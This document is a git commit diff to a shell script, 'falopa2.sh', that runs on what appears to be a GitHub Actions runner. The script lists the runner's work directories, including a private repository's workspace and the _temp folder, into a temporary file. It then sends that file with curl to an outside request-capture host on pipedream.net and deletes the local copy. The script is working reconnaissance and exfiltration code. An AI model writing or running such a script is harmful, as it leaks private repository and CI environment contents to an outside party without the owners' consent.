8c40e40157f0a540f7e36f3ea200142a90592e12
_m <matiasesena@gmail.com>
2021-11-05 10:27:28 -0300

    Update falopa2.sh

--- falopa2.sh
+++ falopa2.sh
@@ -27,6 +27,9 @@ ls -1la /home/runner/work >> /tmp/file.txt
 
 echo "--- home/runner/work/comment-ops-private-matiasesena" >> /tmp/file.txt
 ls -1la /home/runner/work/comment-ops-private-matiasesena >> /tmp/file.txt
+echo "--- home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena" >> /tmp/file.txt
+ls -1la /home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena >> /tmp/file.txt
+
 
 echo "--- home/runner/work/_temp" >> /tmp/file.txt
 ls -1la /home/runner/work/_temp >> /tmp/file.txt
@@ -44,5 +47,3 @@ echo "--- FINISH ---" >> /tmp/file.txt
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
 
 rm /tmp/file.txt
-
-$(find /home/runner) >> /tmp/file.txt
